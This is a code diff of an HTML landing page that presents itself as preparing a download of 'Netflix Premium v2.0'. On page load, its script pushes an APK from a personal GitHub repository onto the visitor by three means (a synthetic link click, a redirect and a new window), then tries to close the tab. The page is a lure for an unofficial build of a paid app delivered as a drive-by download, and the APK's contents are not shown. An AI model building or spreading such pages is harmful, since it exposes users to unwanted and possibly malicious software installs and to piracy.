@@ -1,9 +1,82 @@
-
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta http-equiv="refresh" content="0; url=https://github.com/adabbu466-commits/Netflix-primium-v2.0/raw/main/Netflix%20Premium%20(3)%20(1).apk">
-  </head>
-  <body>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Preparing Download...</title>
+  <style>
+    :root{--bg:#000;--gold:#d4af37}
+    body{margin:0;background:var(--bg);color:var(--gold);font-family:Arial,Helvetica,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;text-align:center}
+    .card{max-width:520px;width:100%;padding:26px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid rgba(212,175,55,0.06);box-shadow:0 10px 30px rgba(0,0,0,0.6)}
+    .title{font-size:20px;margin-bottom:6px}
+    .sub{font-size:14px;opacity:0.95;margin-bottom:14px}
+    .loader{width:56px;height:56px;margin:12px auto;border-radius:50%;border:6px solid rgba(255,255,255,0.06);border-top:6px solid var(--gold);animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .status{margin-top:12px;font-size:13px;color:rgba(212,175,55,0.95)}
+    .fallback{margin-top:14px;font-size:13px;display:none}
+    .fallback a{color:var(--gold);text-decoration:underline}
+    .muted{color:rgba(212,175,55,0.6);font-size:12px;margin-top:8px}
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="title">Netflix Premium v2.0 — Preparing download...</div>
+    <div class="sub">Please keep this tab open. Your download will begin automatically.</div>
+    <div class="loader" aria-hidden="true"></div>
+    <div class="status" id="status">Initializing...</div>
+
+    <div class="fallback" id="fallback">
+      If it doesn't start, <a id="manual" href="#" target="_blank" rel="noopener">click here to download manually</a>.
+    </div>
+    <div class="muted">Note: For best results upload your APK to the same GitHub repo and use the RAW file link.</div>
+  </div>
+
+  <script>
+    (function(){
+      const RAW_FILE_URL = "https://github.com/adabbu466-commits/Netflix-primium-v2.0/raw/refs/heads/main/Netflix%20Premium%20(3)%20(1).apk";
+      const START_DELAY = 1200; // ms before attempting auto-download
+      const SHOW_FALLBACK_MS = 2500;
+
+      const status = document.getElementById('status');
+      const fallback = document.getElementById('fallback');
+      const manual = document.getElementById('manual');
+      manual.href = RAW_FILE_URL;
+
+      function tryAutoDownload() {
+        status.textContent = "Attempting auto-download...";
+        try {
+          const a = document.createElement('a');
+          a.href = RAW_FILE_URL;
+          a.download = ''; 
+          a.rel = 'noopener';
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        } catch(e){}
+
+        setTimeout(() => {
+          try { window.location.href = RAW_FILE_URL; } catch(e) {}
+        }, 400);
+
+        setTimeout(() => {
+          try { window.open(RAW_FILE_URL, '_blank', 'noopener'); } catch(e){}
+        }, 800);
+      }
+
+      setTimeout(() => {
+        status.textContent = "Starting download...";
+        tryAutoDownload();
+      }, START_DELAY);
+
+      setTimeout(() => {
+        status.textContent = "If download didn't start automatically, use manual link below.";
+        fallback.style.display = 'block';
+      }, SHOW_FALLBACK_MS);
+
+      setTimeout(() => {
+        try { window.close(); } catch(e){}
+      }, 6000);
+    })();
+  </script>
+</body>
 </html>
